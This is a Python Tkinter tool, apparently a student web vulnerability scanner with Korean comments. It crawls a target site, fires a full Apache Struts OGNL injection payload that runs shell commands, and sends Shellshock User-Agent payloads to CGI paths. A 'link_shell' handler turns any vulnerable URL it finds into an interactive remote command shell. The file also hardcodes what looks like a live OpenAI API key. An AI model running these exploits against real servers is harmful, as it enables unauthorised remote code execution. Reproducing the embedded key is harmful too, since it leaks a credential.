# chatgpt api 적용 전 버전 (gui, 기능 통합)
import tkinter as tk
from tkinter import *
import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin
import openai
#!import tkinter as tk
#!from tkinter import *
#!import requests
#!from bs4 import BeautifulSoup
#!import re
#!from urllib.parse import urljoin
#!import openai
#openai,urllib.parse,re,bs4,requests,tkinter

openai.api_key= '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'
base_url='a'
visited_urls = set()
change_me = 'example.com'
placeholder_text = "점검을 원하는 주소를 입력해주세요. ex) https://example.com"
messages=[]

def focus_in(event):
    if entry.get() == placeholder_text:
        entry.delete(0, tk.END)
        entry.configure(fg="black")

def focus_out(event):
    if not entry.get():
        entry.configure(fg="gray")
        entry.insert(0, placeholder_text)
        
def on_return(event):
    if entry.get() != placeholder_text:
        print(entry.get())
    else:
        print("점검을 원하는 주소를 입력해주세요. ex) https://example.com")

def print_selected_item(event):
    # 선택한 아이템의 인덱스 가져오기
    index = normal_listbox.curselection()
    
    # 선택한 아이템이 있는지 확인
    if index:
        # 선택한 아이템의 텍스트 가져오기
        selected_item = normal_listbox.get(index)
        
        address = selected_item

        content = "아래는 내가 만든 코드인데 이 코드에서 발생할 수 있는 취약점에 대해서 알려주고 구체적으로 코드에서 수정해야하는 부분을 알려줘 \n"

        response = requests.get(address)

        response_body = response.text

        # get_response_body 함수를 사용하여 응답 본문을 가져옴
        response_body = response.text

        messages.append({"role":"user", "content":f"{content}"+ response_body})

        completion = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=messages
        )

        res_chat = completion.choices[0].message.content

        new_window = tk.Toplevel(root)
        new_window.geometry("1200x960")  # 새 창의 크기 설정
        
        # 프레임 생성
        new_frame = tk.Frame(new_window)
        new_frame.pack(fill="both", expand=True)

        # "ChatGPT의 제안 방안" 레이블 생성
        new_label1 = tk.Label(new_frame, text="ChatGPT의 제안 방안", bg="#eff4d6", font=("Arial", 14))
        new_label1.pack(fill=tk.X, pady=(0,10),ipady=40)

        # "Example" 텍스트 위젯 생성
        text_widget = tk.Text(new_frame, font=("Arial", 12))
        text_widget.insert(tk.END, res_chat)
        text_widget.pack(side="left", fill="both", padx=0, expand=True)

        # 스크롤바 추가
        scrollbar = tk.Scrollbar(new_frame, command=text_widget.yview)
        scrollbar.pack(side="right", fill="y")
        text_widget.config(yscrollcommand=scrollbar.set)





def link_shell(event):
    index = detect_listbox.curselection()
    full_url = detect_listbox.get(index)
    if "shellshock detected in" in full_url:
        # "shellshock detected in" 이후의 내용을 url 변수에 저장
        shellshock_index = full_url.find("shellshock detected in")
        url = full_url[shellshock_index + len("shellshock detected in "):].strip()

        # Tkinter를 사용하여 새 창 생성
        new_window = tk.Toplevel()
        new_window.title("Enter Command")
        new_window.geometry("600x300")
        
        # Label 위젯 생성
        listbox = tk.Listbox(new_window)
        listbox.pack(fill=tk.X,padx=10, pady=5)
        
        # Entry 위젯 생성
        entry = tk.Entry(new_window)
        entry.pack(fill=tk.X, padx=10, pady=5)
        
        
        # 엔터 키에 대한 이벤트 처리
        entry.bind("<Return>", lambda event: get_command())

        
        def get_command():
            cmd = entry.get()
            print("Entered command:", cmd)
            print(cmd)
            print(url)
            user_agent_cmd = f"() {{ :; }}; echo;/bin/bash -c '{cmd}'"
            headers = {"User-Agent": user_agent_cmd}
            response = requests.get(url, headers=headers)
            listbox.insert(END, "입력한 명령어: "+cmd+", 결과: "+response.text)
            entry.delete(0, tk.END)
        
        # 버튼 생성
        button = tk.Button(new_window, text="Submit", command=get_command)
        button.pack(pady=5)


                  
#http://192.168.61.131
    


def func_insert_addr(event=None): 
    deliver_url = change_me = id_.get()
    label_change_me.config(text=change_me)
    root.update()
    func_notAllow(deliver_url)
    func_ognli(deliver_url)
    func_shellshock(deliver_url) 
    entry.delete(0, 'end') 

def func_notAllow(deliver_url):
    url = deliver_url

    methods = ['GET', 'POST', 'PUT', 'PATCH', 'HEAD', 'OPTIONS'] #DELETE 메소드 제외

    for method in methods:
        response = requests.request(method, url)
        detect_listbox.insert(END, f'Method: {method}, Response Code: {response.status_code}')
        root.update()  # GUI 업데이트
    
def func_ognli(deliver_url):
    base_url = deliver_url.rstrip('/')
    file_path= "ognlWordList.txt"

    with open(file_path, 'r') as file:
        lines = file.readlines()

    # OGNL 페이로드 echo !OGNL_INJECTION! 출력
    ognl_payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo !OGNL_INJECTION!').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"

    # Content-Type 헤더에 페이로드 삽입
    headers = {"Content-Type": ognl_payload}
    
    
    if lines:
        for line in lines:
            path = line.strip()

            full_url = base_url + path

            response = requests.get(full_url, headers=headers)

            history_listbox.insert(END, f" url : {full_url}")
            root.update()
            
            if response.status_code == 200:
                #print(f" url : {full_url}, Status code: {response.status_code}") #listbox.insert로 변경
                normal_listbox.insert(END, full_url)
                
                root.update()  # GUI 업데이트

                if "!OGNL_INJECTION!" in response.text:
                    detect_listbox.insert(END, f"OGNL Injection detected in {full_url}")
                    root.update()  # GUI 업데이트

    else:
        print(f"Failed to read content from file: {file_path}")



def func_shellshock(deliver_url): # shellshock 탐지 함수 
    file_path = "cgiWordList.txt"  
    base_url=deliver_url

    with open(file_path, 'r') as file:
        lines = file.readlines()

    def get_links_from_url(url):
        response = requests.get(url)
        if response.status_code == 200:
            # 정규식 패턴을 사용하여 링크 추출
            url_pattern = r'(?<=href=["\'])(https?:\/\/[^"\']*(?=")|\/[^"\'>]*)'
            links = re.findall(url_pattern, response.text)
            return links
        else:
            print(f"Failed to retrieve {url}. Status code: {response.status_code}")
            return []
    
    def recursively_visit_links(start_url, depth):
        global visited_urls

        if depth == 0:
            return

        if start_url in visited_urls:
            return
        visited_urls.add(start_url)

        # URL의 길이가 일정 길이 이상인 경우 방문하지 않음
        if len(start_url) > 100:
            print(f"URL {start_url} is too long. Skipping.")
            return
        
        if not start_url.startswith(base_url):
            print(f"Starting URL {start_url} does not match base URL {base_url}. Stopping the search.")
            return
        

        history_listbox.insert(END, f" url : {start_url}")
        normal_listbox.insert(END, start_url)

        root.update()


        links = get_links_from_url(start_url)

        for link in links:
            absolute_link = link if link.startswith("http") else urljoin(start_url, link)
            recursively_visit_links(absolute_link, depth - 1)
            
        if "cgi" in start_url:
            headers = {"User-Agent": "() { :; }; echo;/bin/bash -c 'echo she!1 sh0ck De+ecTed'"}
            response = requests.get(start_url, headers=headers)
            if "she!1 sh0ck De+ecTed" in response.text:
                detect_listbox.insert(END, f"shellshock detected in {full_url}")
                root.update()  # GUI 업데이트
    
    # 시작 URL부터 재귀적으로 탐색 시작
    recursively_visit_links(base_url, 10) 

    if lines:
        for line in lines:
            path = line.strip()

            # 만약 시작이 '/'로 시작하지 않으면 추가하는 구문
            if not path.startswith('/'):
                path = '/' + path

            full_url = base_url + path
            headers = {"User-Agent": "() { :; }; echo;/bin/bash -c 'echo she!1 sh0ck De+ecTed'"}
            response = requests.get(full_url, headers=headers)
            #print(f"Request URL: {full_url}")

            if response.status_code == 200:
                #print(f" url : {full_url}, Status code: {response.status_code}") #listbox.insert로 변경
                history_listbox.insert(END, f" url : {full_url}, Status code: {response.status_code}")
                normal_listbox.insert(END, full_url)
                
                root.update()  # GUI 업데이트
                if "she!1 sh0ck De+ecTed" in response.text:
                    detect_listbox.insert(END, f"shellshock detected in {full_url}")
                    root.update()  # GUI 업데이트


            else:
                #print(f"error! about url : {full_url}") # listbox.insert로 변경
                history_listbox.insert(END, f"error! about url : {full_url}")
                root.update()  # GUI 업데이트
    else:
        print(f"Failed to read content from file: {file_path}")



def menu_click(menu_item):
    print("Selected:", menu_item)

root = tk.Tk()
root.geometry("1024x700")
id_ = tk.StringVar()

# 왼쪽 프레임
left_frame = tk.Frame(root, bg="#4c624b", width=150)
left_frame.pack(side=tk.LEFT, fill=tk.Y)

# 내비게이션 메뉴 생성
navigation_menu = ["메인"," ","점검", "설정", "기타"]

for menu_item in navigation_menu:
    menu_button = tk.Button(left_frame, text=menu_item, width=8, height=2, command=lambda item=menu_item: menu_click(item), bg='#4c624b',fg='white', highlightthickness=0,bd=0)
    menu_button.pack(pady=5)

# 오른쪽 프레임
right_frame = tk.Frame(root, bg="white")
right_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

# 상단 Label 생성
label_target = tk.Label(right_frame, text="타겟 주소 :", bg="white", fg="black", height=1, anchor="sw", padx=20)
label_target.pack(fill=tk.X)

# 하단 Label 생성
label_change_me = tk.Label(right_frame, text=change_me, bg="white", fg="black", height=1, anchor="nw", padx=20, font=("Arial", 18))
label_change_me.pack(fill=tk.X, pady=(0, 0))

# 검은 선 긋기
#line_canvas = tk.Canvas(right_frame, bg="dimgray", height=1)
#line_canvas.pack(fill=tk.X)

# 두 개의 하위 프레임 생성
bottom_frame_left = tk.Frame(right_frame)
bottom_frame_left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

bottom_frame_right = tk.Frame(right_frame)#, bg='yellow')
bottom_frame_right.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

# 탐색 경로 history 레이블과 Listbox가 들어갈 하위 프레임 생성
history_frame = tk.Frame(bottom_frame_left, width=100)
history_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=(0, 20))

# 좌우 스크롤바 생성
history_scrollbar_x = tk.Scrollbar(history_frame, orient=tk.HORIZONTAL)
history_scrollbar_x.pack(side=tk.BOTTOM, fill=tk.X)

# 상하 스크롤바 생성
history_scrollbar_y = tk.Scrollbar(history_frame)
history_scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)

# 탐색 경로 history 레이블 추가
history_label = tk.Label(history_frame, text="탐색 경로 history", bg="#eff4d6")
history_label.pack(side=tk.TOP, padx=(20, 20), pady=(20, 0), fill=tk.X)

# Listbox 추가 (bottom_frame_left)
history_listbox = tk.Listbox(history_frame)
history_listbox.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=(20,20), pady=(0, 20), ipadx=5, ipady=5)


# Listbox에 스크롤바 설정
history_listbox.config(xscrollcommand=history_scrollbar_x.set, yscrollcommand=history_scrollbar_y.set)

# 스크롤바와 Listbox 연결
history_scrollbar_x.config(command=history_listbox.xview)
history_scrollbar_y.config(command=history_listbox.yview)

# Listbox 추가 (bottom_frame_right)
detect_frame = tk.Frame(bottom_frame_right, width=100)
detect_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=(0, 30))

# 탐색 경로 history 레이블 추가
detect_label = tk.Label(detect_frame, text="발견된 취약점 및 경로", bg="#eff4d6")
detect_label.pack(side=tk.TOP, padx=(20, 20), pady=(20, 0), fill=tk.X)

# Calculate the height of the detect_listbox
detect_listbox_height = bottom_frame_right.winfo_reqheight() // 2

# Listbox 추가 (bottom_frame_right)
detect_listbox = tk.Listbox(detect_frame, height=detect_listbox_height)
detect_listbox.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=(20,20), pady=(0, 0), ipadx=5, ipady=5)
detect_listbox.bind("<Double-Button-1>", link_shell)

# normalle_frame 생성
normal_frame = tk.Frame(bottom_frame_right)
normal_frame.pack(side=tk.TOP, fill=tk.BOTH, padx=20, pady=0, expand=True)

# 스크롤바 생성
normal_scrollbar = tk.Scrollbar(normal_frame)
normal_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

# normalle_frame에 라벨 추가
normal_label = tk.Label(normal_frame, text="작동하는 주소", bg="#eff4d6", fg="black")
normal_label.pack(side=tk.TOP, padx=20, pady=(0, 0), fill=tk.X)

normal_listbox_height = bottom_frame_right.winfo_reqheight() // 2

# normal_frame에 listbox 추가
normal_listbox = tk.Listbox(normal_frame, height=normal_listbox_height)
normal_listbox.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=(20,20), pady=(0, 40), ipadx=5, ipady=5)

# 스크롤바와 listbox 연결
normal_listbox.config(yscrollcommand=normal_scrollbar.set)
normal_scrollbar.config(command=normal_listbox.yview)
normal_listbox.bind("<Double-Button-1>", print_selected_item)
    
# handle_frame 생성
handle_frame = tk.Frame(bottom_frame_right)
handle_frame.pack(side=tk.TOP, fill=tk.BOTH, padx=20, pady=0, expand=True)

# handle_frame에 라벨 추가
handle_label = tk.Label(handle_frame, text="메모장", bg="#eff4d6", fg="black")
handle_label.pack(side=tk.TOP, padx=20, pady=(0, 0), fill=tk.X)

# handle_frame에 텍스트 위젯 추가
handle_text = tk.Text(handle_frame)
handle_text.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=20, pady=(0, 20))


# Entry 위젯 추가
entry = tk.Entry(handle_frame,textvariable=id_)
entry.insert(0, placeholder_text)
entry.pack(side=tk.LEFT, padx=(20, 0), pady=(0,30), fill=tk.X, expand=True)
entry.bind("<FocusIn>", focus_in)
entry.bind("<FocusOut>", focus_out)
entry.bind("<Return>", func_insert_addr)  # 엔터 키에 대한 이벤트 처리

# 버튼 추가
button = tk.Button(handle_frame, text="통합 점검", bg="#4c624b", fg="white", command=func_insert_addr)
button.pack(side=tk.LEFT, padx=(10, 20), pady=(0,40))


root.mainloop()
 

##eff4d6 노란색
##aed8b0 초록색